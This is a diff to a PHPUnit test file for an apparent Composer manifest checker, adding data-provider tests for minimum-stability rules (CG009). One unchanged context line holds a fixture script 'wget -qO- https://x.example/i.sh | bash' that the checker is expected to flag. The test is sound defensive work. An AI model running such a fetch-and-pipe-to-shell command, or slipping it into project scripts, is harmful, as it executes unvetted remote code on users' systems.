@@ -100,4 +100,25 @@ final class ChecksTest extends TestCase
         $p = self::project(['scripts' => ['setup' => 'wget -qO- https://x.example/i.sh | bash', 'test' => 'phpunit']]);
         self::assertSame(['CG008:3'], self::ids($p));
     }
+
+    /** @return iterable<string, array{array<string, mixed>, list<string>}> */
+    public static function stability(): iterable
+    {
+        yield 'dev without prefer-stable' => [['minimum-stability' => 'dev'], ['CG009']];
+        yield 'beta with prefer-stable false' => [['minimum-stability' => 'beta', 'prefer-stable' => false], ['CG009']];
+        yield 'RC in upper case' => [['minimum-stability' => 'RC'], ['CG009']];
+        yield 'dev with prefer-stable' => [['minimum-stability' => 'dev', 'prefer-stable' => true], []];
+        yield 'stable' => [['minimum-stability' => 'stable'], []];
+        yield 'not set' => [[], []];
+    }
+
+    /**
+     * @param array<string, mixed> $json
+     * @param list<string> $want
+     */
+    #[DataProvider('stability')]
+    public function testMinimumStability(array $json, array $want): void
+    {
+        self::assertSame($want, array_map(static fn (string $s): string => explode(':', $s)[0], self::ids(self::project($json))));
+    }
 }
